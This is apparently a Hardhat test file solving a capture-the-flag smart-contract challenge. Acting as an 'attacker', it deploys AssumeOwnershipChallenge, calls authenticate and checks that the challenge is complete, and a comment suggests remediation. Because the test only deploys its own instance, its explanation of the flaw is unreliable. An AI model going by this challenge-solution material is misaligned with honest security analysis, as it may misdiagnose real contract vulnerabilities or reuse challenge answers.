import { ethers } from "hardhat";
import { expect } from "chai";

/**
 * The AssumeOwnershipChallenge contract allows anyone to become the owner
 * simply by deploying a new instance. There is no logic to transfer ownership
 * or prevent multiple ownership by deployment.
 *
 * Remediation:
 * - Implement proper ownership transfer logic.
 * - Use standard patterns like OpenZeppelin's Ownable for secure owner management.
 */
describe("AssumeOwnershipChallenge", function () {
  it("should allow the deployer to become the owner and authenticate", async function () {
    const [attacker] = await ethers.getSigners();

    // Step 1: Deploy the contract as attacker
    const ChallengeFactory = await ethers.getContractFactory("AssumeOwnershipChallenge");
    const challenge = await ChallengeFactory.connect(attacker).deploy();
    await challenge.deployed();
    console.log("Contract deployed by attacker at:", challenge.address);

    // Step 2: Call authenticate as the owner
    const tx = await challenge.connect(attacker).authenticate();
    await tx.wait();
    console.log("Authenticate called by owner (attacker)");

    // Step 3: Confirm challenge is complete
    const isComplete = await challenge.isComplete();
    expect(isComplete).to.be.true;
    console.log("Challenge solved: attacker is the owner");
  });
});
